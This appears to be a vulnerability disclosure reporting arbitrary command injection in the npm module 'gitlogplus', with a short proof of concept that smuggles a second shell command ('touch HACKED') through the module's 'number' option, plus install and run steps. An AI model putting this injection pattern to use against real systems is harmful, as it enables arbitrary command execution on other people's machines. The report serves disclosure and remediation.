# :bug: Description

The `gitlogplus` module is vulnerable against an `arbitrary command injection` issue which is made possible since some `user-inputs` are executed inside a command which doesn't have validations of any kind.

# :fire: POC

1. Create the following PoC file:

```js
// poc.js
var git = require('gitlogplus');
git({repo:'.', number:'eeee; touch HACKED; #'})

```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i gitlogplus # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
